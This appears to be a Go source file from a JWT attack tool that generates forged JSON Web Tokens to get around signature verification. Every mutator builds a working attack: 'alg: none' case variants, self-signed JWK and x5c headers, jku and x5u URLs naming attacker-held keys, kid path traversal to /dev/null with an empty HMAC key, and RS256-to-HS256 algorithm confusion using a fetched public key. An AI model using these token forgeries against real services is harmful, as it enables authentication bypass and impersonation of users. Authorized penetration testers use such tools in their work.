package main

import (
	"crypto/rsa"
	"encoding/base64"
	"fmt"
	"strings"
)

type MutationResult struct {
	Label string
	Token string
}

type Mutator interface {
	Mutate(header, payload string) ([]MutationResult, error)
}

type PayloadMutator struct {
	CustomPayload     string
	OriginalSignature string
	FoundSecret       string
}

func (m *PayloadMutator) Mutate(header, payload string) ([]MutationResult, error) {
	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	hEnc := Base64URLEncode([]byte(header))
	pEnc := Base64URLEncode([]byte(targetPayload))

	if m.FoundSecret != "" {
		return []MutationResult{{
			Label: "Payload (with found secret)",
			Token: SignHS256(header, targetPayload, []byte(m.FoundSecret)),
		}}, nil
	}

	if m.OriginalSignature == "" {
		return nil, fmt.Errorf("no signature")
	}

	return []MutationResult{{
		Label: "Payload (keep sig)",
		Token: fmt.Sprintf("%s.%s.%s", hEnc, pEnc, m.OriginalSignature),
	}}, nil
}

type NoneMutator struct{}

func (m *NoneMutator) Mutate(header, payload string) ([]MutationResult, error) {
	variations := []string{"none", "None", "NONE", "nOnE", "NoNe", "none.", "None.", "none ", " none"}
	var results []MutationResult

	for _, alg := range variations {
		modHeader, err := JSONModify(header, "alg", alg)
		if err != nil {
			return nil, err
		}

		hEnc := Base64URLEncode([]byte(modHeader))
		pEnc := Base64URLEncode([]byte(payload))

		results = append(results, MutationResult{
			Label: fmt.Sprintf("Alg:none (%s)", alg),
			Token: fmt.Sprintf("%s.%s.", hEnc, pEnc),
		})
	}

	return results, nil
}

type JwkMutator struct {
	CustomPayload string
	SigningKey    *rsa.PrivateKey
}

func (m *JwkMutator) Mutate(header, payload string) ([]MutationResult, error) {
	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	privKey := m.SigningKey
	var err error
	if privKey == nil {
		privKey, err = GenerateRSAKey()
		if err != nil {
			return nil, err
		}
	}

	jwk := GetJWKFromPublic(&privKey.PublicKey)

	modHeader, err := JSONModify(header, "alg", "RS256")
	if err != nil {
		return nil, err
	}
	modHeader, err = JSONModify(modHeader, "jwk", jwk)
	if err != nil {
		return nil, err
	}
	if kid, ok := jwk["kid"].(string); ok {
		modHeader, err = JSONModify(modHeader, "kid", kid)
		if err != nil {
			return nil, err
		}
	}

	signedToken, err := SignRS256(modHeader, targetPayload, privKey)
	if err != nil {
		return nil, err
	}

	return []MutationResult{{
		Label: "JWK (self-signed)",
		Token: signedToken,
	}}, nil
}

type JkuMutator struct {
	CustomPayload string
	JkuURL        string
	SigningKey    *rsa.PrivateKey
}

func (m *JkuMutator) Mutate(header, payload string) ([]MutationResult, error) {
	if m.JkuURL == "" {
		return nil, nil
	}

	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	privKey := m.SigningKey
	var err error
	if privKey == nil {
		privKey, err = GenerateRSAKey()
		if err != nil {
			return nil, err
		}
	}

	jwk := GetJWKFromPublic(&privKey.PublicKey)
	var results []MutationResult

	// Variant 1: with kid
	modHeader, err := JSONModify(header, "alg", "RS256")
	if err != nil {
		return nil, err
	}
	modHeader, err = JSONModify(modHeader, "jku", m.JkuURL)
	if err != nil {
		return nil, err
	}
	if kid, ok := jwk["kid"].(string); ok {
		modHeader, err = JSONModify(modHeader, "kid", kid)
		if err != nil {
			return nil, err
		}
	}
	signedToken, err := SignRS256(modHeader, targetPayload, privKey)
	if err != nil {
		return nil, err
	}
	results = append(results, MutationResult{
		Label: "JKU (with kid)",
		Token: signedToken,
	})

	// Variant 2: without kid (minimal header)
	cleanHeader, err := JSONModify(header, "alg", "RS256")
	if err != nil {
		return nil, err
	}
	cleanHeader, err = JSONModify(cleanHeader, "jku", m.JkuURL)
	if err != nil {
		return nil, err
	}
	cleanHeader, err = JSONDelete(cleanHeader, "kid")
	if err != nil {
		return nil, err
	}
	signedToken2, err := SignRS256(cleanHeader, targetPayload, privKey)
	if err != nil {
		return nil, err
	}
	results = append(results, MutationResult{
		Label: "JKU (no kid)",
		Token: signedToken2,
	})

	return results, nil
}

type KidMutator struct {
	CustomPayload string
}

func (m *KidMutator) Mutate(header, payload string) ([]MutationResult, error) {
	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	var traversals []string
	for i := 0; i <= 20; i++ {
		prefix := strings.Repeat("../", i)
		traversals = append(traversals, prefix+"dev/null")
	}

	var results []MutationResult
	for _, kid := range traversals {
		results = append(results, m.kidVariants(header, targetPayload, kid, false)...)
		b64Kid := base64.StdEncoding.EncodeToString([]byte(kid))
		results = append(results, m.kidVariants(header, targetPayload, b64Kid, true)...)
	}

	return results, nil
}

func (m *KidMutator) kidVariants(header, payload, kid string, isBase64 bool) []MutationResult {
	tag := ""
	if isBase64 {
		tag = " [B64]"
	}

	modHeader, err := JSONModify(header, "alg", "HS256")
	if err != nil {
		return nil
	}
	modHeader, err = JSONModify(modHeader, "kid", kid)
	if err != nil {
		return nil
	}

	token := SignHS256(modHeader, payload, []byte(""))
	return []MutationResult{{
		Label: fmt.Sprintf("KID%s (%s)", tag, kid),
		Token: token,
	}}
}

type AlgConfusionMutator struct {
	CustomPayload string
	PublicKey     []byte
	TargetURL     string
}

func (m *AlgConfusionMutator) Mutate(header, payload string) ([]MutationResult, error) {
	var secret []byte
	var label string

	if m.TargetURL != "" {
		var fileContent []byte
		var err error

		if strings.HasSuffix(m.TargetURL, "/jwks.json") || strings.HasSuffix(m.TargetURL, "/jwks") {
			fileContent, err = FetchPubKeyFromJKU(m.TargetURL)
			label = "Alg Confusion (JWKS Key)"
		} else {
			fileContent, err = FetchFileContent(m.TargetURL)
			label = "Alg Confusion (Target File)"
		}

		if err != nil {
			return nil, err
		}
		secret = fileContent
	} else if len(m.PublicKey) > 0 {
		secret = m.PublicKey
		label = "Alg Confusion (PubKey)"
	} else {
		return nil, nil
	}

	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	modHeader, err := JSONModify(header, "alg", "HS256")
	if err != nil {
		return nil, err
	}

	signedToken := SignHS256(modHeader, targetPayload, secret)

	return []MutationResult{{
		Label: label,
		Token: signedToken,
	}}, nil
}

type X5cMutator struct {
	CustomPayload string
	SigningKey    *rsa.PrivateKey
}

func (m *X5cMutator) Mutate(header, payload string) ([]MutationResult, error) {
	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	privKey := m.SigningKey
	if privKey == nil {
		var err error
		privKey, err = GenerateRSAKey()
		if err != nil {
			return nil, err
		}
	}

	der, err := GenerateSelfSignedCert(privKey)
	if err != nil {
		return nil, err
	}

	x5c := []string{base64.StdEncoding.EncodeToString(der)}

	modHeader, err := JSONModify(header, "alg", "RS256")
	if err != nil {
		return nil, err
	}
	modHeader, err = JSONModify(modHeader, "x5c", x5c)
	if err != nil {
		return nil, err
	}

	signedToken, err := SignRS256(modHeader, targetPayload, privKey)
	if err != nil {
		return nil, err
	}

	return []MutationResult{{
		Label: "X5C (cert chain)",
		Token: signedToken,
	}}, nil
}

type X5uMutator struct {
	CustomPayload string
	X5uURL        string
	SigningKey    *rsa.PrivateKey
}

func (m *X5uMutator) Mutate(header, payload string) ([]MutationResult, error) {
	if m.X5uURL == "" {
		return nil, nil
	}

	targetPayload := payload
	if m.CustomPayload != "" {
		targetPayload = m.CustomPayload
	}

	privKey := m.SigningKey
	if privKey == nil {
		var err error
		privKey, err = GenerateRSAKey()
		if err != nil {
			return nil, err
		}
	}

	modHeader, err := JSONModify(header, "alg", "RS256")
	if err != nil {
		return nil, err
	}
	modHeader, err = JSONModify(modHeader, "x5u", m.X5uURL)
	if err != nil {
		return nil, err
	}

	signedToken, err := SignRS256(modHeader, targetPayload, privKey)
	if err != nil {
		return nil, err
	}

	return []MutationResult{{
		Label: "X5U (cert URL)",
		Token: signedToken,
	}}, nil
}
